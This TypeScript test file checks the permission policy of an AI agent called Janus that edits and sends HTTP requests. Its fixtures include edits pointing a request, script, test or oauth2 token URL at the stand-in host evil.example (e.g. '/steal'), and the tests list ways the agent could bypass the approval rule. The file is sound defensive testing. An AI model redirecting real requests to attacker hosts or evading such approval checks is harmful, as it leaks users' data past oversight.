import { describe, it, expect } from 'vitest';
import { PermissionPolicy, type ApprovalRequest } from '../src/permissions';
import { createTools } from '../src/tools';
import { FakeHost, req } from './helpers';

const tools = createTools();
const t = (name: string) => tools.find((x) => x.def.name === name)!;

describe('permission policy', () => {
  it('allows reads and draft edits, and always asks for creating requests and variables', () => {
    const p = new PermissionPolicy({ askBeforeSend: true });
    const host = new FakeHost();
    for (const name of ['list_requests', 'get_request', 'get_environment', 'get_last_response', 'edit_request']) {
      expect(p.decide(t(name), {}, host)).toEqual({ kind: 'allow' });
    }
    expect(p.decide(t('create_request'), { folderId: 'users', request: { name: 'X', method: 'GET', url: '/x' } }, host)).toMatchObject({ kind: 'ask', approval: { kind: 'create-request', folderId: 'users' } });
    p.record({ kind: 'create-request', folderId: '', request: {} as never }, 'allow-conversation');
    expect(p.decide(t('create_request'), { folderId: '', request: { name: 'Y', method: 'GET', url: '/y' } }, host).kind).toBe('ask');
  });

  it('shows secret values as dots in variable approvals', () => {
    const p = new PermissionPolicy({ askBeforeSend: true });
    const host = new FakeHost({ env: { name: 'Dev', variables: [{ name: 'API_TOKEN', secret: true }, { name: 'page', value: '1', secret: false }] } });
    expect(p.decide(t('set_env_variable'), { name: 'API_TOKEN', value: 'sk-live-123', secret: true }, host)).toEqual({
      kind: 'ask', approval: { kind: 'set-env-variable', name: 'API_TOKEN', secret: true, oldValue: '••••', newValue: 'sk-live-123' },
    });
    expect(p.decide(t('set_env_variable'), { name: 'page', value: '2' }, host)).toEqual({
      kind: 'ask', approval: { kind: 'set-env-variable', name: 'page', secret: false, oldValue: '1', newValue: '2' },
    });
    expect(p.decide(t('set_env_variable'), { name: 'API_TOKEN', value: 'plain' }, host)).toEqual({
      kind: 'ask', approval: { kind: 'set-env-variable', name: 'API_TOKEN', secret: true, oldValue: '••••', newValue: 'plain' },
    });
  });

  it('asks before sending until allowed for the conversation, or never when the setting is off', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: true });
    const ask = p.decide(t('send_request'), {}, host);
    expect(ask).toEqual({ kind: 'ask', approval: { kind: 'send', requestId: 'create.req.yml', method: 'POST', url: '{{baseUrl}}/articles', host: 'api.local' } });
    p.record((ask as { approval: ApprovalRequest }).approval, 'allow-once');
    expect(p.decide(t('send_request'), {}, host).kind).toBe('ask');
    p.record((ask as { approval: ApprovalRequest }).approval, 'allow-conversation');
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    expect(new PermissionPolicy({ askBeforeSend: false }).decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
  });

  it('applies the new-host rule to requests Janus edited, even when sends are otherwise allowed', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/url', value: 'https://evil.example/steal' }]);
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    p.noteEdit('create.req.yml');
    const ask = p.decide(t('send_request'), { id: 'create.req.yml' }, host);
    expect(ask).toEqual({ kind: 'ask', approval: { kind: 'new-host', requestId: 'create.req.yml', host: 'evil.example' } });
    p.record((ask as { approval: ApprovalRequest }).approval, 'allow-conversation');
    expect(p.decide(t('send_request'), {}, host).kind).toBe('ask');
    host.editRequest('create.req.yml', [{ op: 'set', path: '/url', value: '{{baseUrl}}/articles' }]);
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
  });

  it('treats an unresolvable target host as new', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/url', value: '{{other}}/x' }]);
    p.noteEdit('create.req.yml');
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'ask', approval: { kind: 'new-host', requestId: 'create.req.yml', host: '(unknown host)' } });
  });
});

describe('new-host rule bypasses (R10)', () => {
  const NEW_HOST = (requestId: string, host: string) => ({ kind: 'ask', approval: { kind: 'new-host', requestId, host } });

  it('observe adds touched ids and sticky taint from the session, and never removes them', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/url', value: 'https://evil.example/x' }]);
    p.observe({ touchedIds: ['create.req.yml'], tainted: false });
    expect(p.edited.has('create.req.yml')).toBe(true);
    expect(p.decide(t('send_request'), {}, host)).toEqual(NEW_HOST('create.req.yml', 'evil.example'));
    p.observe({ touchedIds: [], tainted: false });
    expect(p.edited.has('create.req.yml')).toBe(true);

    const q = new PermissionPolicy({ askBeforeSend: false });
    const other = new FakeHost();
    expect(q.decide(t('send_request'), {}, other)).toEqual({ kind: 'allow' });
    other.editRequest('create.req.yml', [{ op: 'set', path: '/url', value: 'https://evil.example/x' }]);
    q.observe({ touchedIds: [], tainted: true });
    expect(q.decide(t('send_request'), {}, other)).toEqual(NEW_HOST('create.req.yml', 'evil.example'));
    q.observe({ touchedIds: [], tainted: false });
    expect(q.decide(t('send_request'), {}, other)).toEqual(NEW_HOST('create.req.yml', 'evil.example'));
  });
  const evilReq = () => req('Evil', 'GET', 'https://evil.example/x');

  it('a Janus-edited script is treated as an unknown destination, an untouched script is not', () => {
    const host = new FakeHost({ requests: { 'create.req.yml': req('C', 'POST', '{{baseUrl}}/articles', { script: 'ctx.log(1)' }) } });
    const p = new PermissionPolicy({ askBeforeSend: false });
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/script', value: 'await fetch("https://evil.example")' }]);
    p.noteEdit('create.req.yml');
    expect(p.decide(t('send_request'), {}, host)).toEqual(NEW_HOST('create.req.yml', "(chosen by the request's scripts)"));
  });

  it('checks the oauth2 token url of an edited request', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/auth', value: { type: 'oauth2', grant: 'client_credentials', tokenUrl: 'https://evil.example/t', clientId: 'c' } }]);
    p.noteEdit('create.req.yml');
    expect(p.decide(t('send_request'), {}, host)).toEqual(NEW_HOST('create.req.yml', 'evil.example'));
  });

  it('keeps checking a request Janus created after it was saved', async () => {
    const host = new FakeHost({ dynamicKnownHosts: true });
    const p = new PermissionPolicy({ askBeforeSend: false });
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    const id = await host.createRequest('', evilReq());
    p.noteCreated(id);
    expect(p.edited.has(id)).toBe(true);
    expect(p.decide(t('send_request'), { id }, host)).toEqual(NEW_HOST(id, 'evil.example'));
  });

  it('treats every request as touched after an environment write', async () => {
    const host = new FakeHost({ dynamicKnownHosts: true });
    const p = new PermissionPolicy({ askBeforeSend: false });
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    await host.setEnvVariable('baseUrl', 'https://evil.example', false);
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    p.noteEnvWrite();
    expect(p.decide(t('send_request'), {}, host)).toEqual(NEW_HOST('create.req.yml', 'evil.example'));
  });

  it('uses the first snapshot of known hosts, so later environment changes cannot launder a host', async () => {
    const host = new FakeHost({ dynamicKnownHosts: true });
    const p = new PermissionPolicy({ askBeforeSend: false });
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/url', value: 'https://evil.example/x' }]);
    p.noteEdit('create.req.yml');
    await host.setEnvVariable('other', 'https://evil.example', false);
    expect(host.knownHosts().has('evil.example')).toBe(true);
    expect(p.decide(t('send_request'), {}, host)).toEqual(NEW_HOST('create.req.yml', 'evil.example'));
  });

  it('treats edited tests like a script', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    host.editRequest('create.req.yml', [{ op: 'set', path: '/tests', value: "env.set('baseUrl','https://evil.example')" }]);
    p.noteEdit('create.req.yml');
    expect(p.decide(t('send_request'), {}, host)).toEqual(NEW_HOST('create.req.yml', "(chosen by the request's scripts)"));
  });

  it('taints later sends once a touched request with scripts or tests was decided', () => {
    const host = new FakeHost({ requests: { 'a.req.yml': req('A', 'GET', 'http://api.local/a'), 'b.req.yml': req('B', 'GET', '{{baseUrl}}/b') } });
    const p = new PermissionPolicy({ askBeforeSend: false });
    host.editRequest('a.req.yml', [{ op: 'set', path: '/tests', value: "env.set('baseUrl','https://evil.example')" }]);
    p.noteEdit('a.req.yml');
    expect(p.decide(t('send_request'), { id: 'a.req.yml' }, host).kind).toBe('ask');
    host.env.variables = [{ name: 'baseUrl', value: 'https://evil.example', secret: false }];
    expect(p.decide(t('send_request'), { id: 'b.req.yml' }, host)).toEqual(NEW_HOST('b.req.yml', 'evil.example'));
  });

  it('allows an untouched request with the user\'s own tests when Janus did nothing', () => {
    const host = new FakeHost({ requests: { 'a.req.yml': req('A', 'GET', 'http://api.local/a', { tests: 'expect(1).toBe(1)' }) } });
    const p = new PermissionPolicy({ askBeforeSend: false });
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
  });

  it('taints sends when a Janus-touched request carries tests, even if the user ran it outside decide()', () => {
    const host = new FakeHost({ requests: { 'a.req.yml': req('A', 'GET', 'http://api.local/a'), 'b.req.yml': req('B', 'GET', '{{baseUrl}}/b') } });
    const p = new PermissionPolicy({ askBeforeSend: false });
    host.editRequest('a.req.yml', [{ op: 'set', path: '/tests', value: "env.set('baseUrl','https://evil.example')" }]);
    p.noteEdit('a.req.yml');
    host.env.variables = [{ name: 'baseUrl', value: 'https://evil.example', secret: false }];
    expect(p.decide(t('send_request'), { id: 'b.req.yml' }, host)).toEqual(NEW_HOST('b.req.yml', 'evil.example'));
  });

  it('keeps the scripts taint after Janus removes the tests the user already ran', () => {
    const host = new FakeHost({ requests: { 'a.req.yml': req('A', 'GET', 'http://api.local/a'), 'b.req.yml': req('B', 'GET', '{{baseUrl}}/b') } });
    const p = new PermissionPolicy({ askBeforeSend: false });
    // 1. Janus sets A's tests to redirect baseUrl.
    host.editRequest('a.req.yml', [{ op: 'set', path: '/tests', value: "env.set('baseUrl','https://evil.example')" }]);
    p.noteEdit('a.req.yml');
    // 2. The user presses Send on A themselves; the runtime variables are poisoned without decide() seeing a send.
    host.env.variables = [{ name: 'baseUrl', value: 'https://evil.example', secret: false }];
    // 3. Janus removes A's tests; the loop decides before running the tool.
    const removeOps = [{ op: 'remove', path: '/tests' }];
    expect(p.decide(t('edit_request'), { id: 'a.req.yml', ops: removeOps }, host)).toEqual({ kind: 'allow' });
    expect(host.editRequest('a.req.yml', removeOps as never)).toEqual({ ok: true });
    p.noteEdit('a.req.yml');
    expect(host.getRequest('a.req.yml')?.tests?.trim() ?? '').toBe('');
    // 4. Sending untouched B must still be checked against the snapshot.
    expect(p.decide(t('send_request'), { id: 'b.req.yml' }, host)).toEqual(NEW_HOST('b.req.yml', 'evil.example'));
  });

  it('can start a conversation tainted', () => {
    const host = new FakeHost({ requests: { 'e.req.yml': req('E', 'GET', 'https://evil.example/x') } });
    expect(new PermissionPolicy({ askBeforeSend: false }).decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    expect(new PermissionPolicy({ askBeforeSend: false }, { startTainted: true }).decide(t('send_request'), {}, host)).toEqual(NEW_HOST('e.req.yml', 'evil.example'));
  });

  it('always asks for a text-parsed send and never turns its answer into a conversation grant; reads and edits stay auto', () => {
    const host = new FakeHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    for (const name of ['list_requests', 'find_requests', 'get_request', 'get_environment', 'get_last_response', 'get_run_results', 'get_graphql_schema', 'get_history', 'edit_request']) {
      expect(p.decide(t(name), {}, host, { textParsed: true })).toEqual({ kind: 'allow' });
    }
    const ask = p.decide(t('send_request'), {}, host, { textParsed: true });
    expect(ask).toMatchObject({ kind: 'ask', approval: { kind: 'send', requestId: 'create.req.yml', textParsed: true } });
    p.record((ask as { approval: ApprovalRequest }).approval, 'allow-conversation');
    expect(p.decide(t('send_request'), {}, host, { textParsed: true }).kind).toBe('ask');
    expect(p.decide(t('send_request'), {}, host)).toEqual({ kind: 'allow' });
    const q = new PermissionPolicy({ askBeforeSend: true });
    q.record((q.decide(t('send_request'), {}, host, { textParsed: true }) as { approval: ApprovalRequest }).approval, 'allow-conversation');
    expect(q.decide(t('send_request'), {}, host).kind).toBe('ask');
    expect(q.decide(t('create_request'), { folderId: '', request: {} }, host, { textParsed: true }).kind).toBe('ask');
    expect(q.decide(t('set_env_variable'), { name: 'a', value: 'b' }, host, { textParsed: true }).kind).toBe('ask');
  });
});
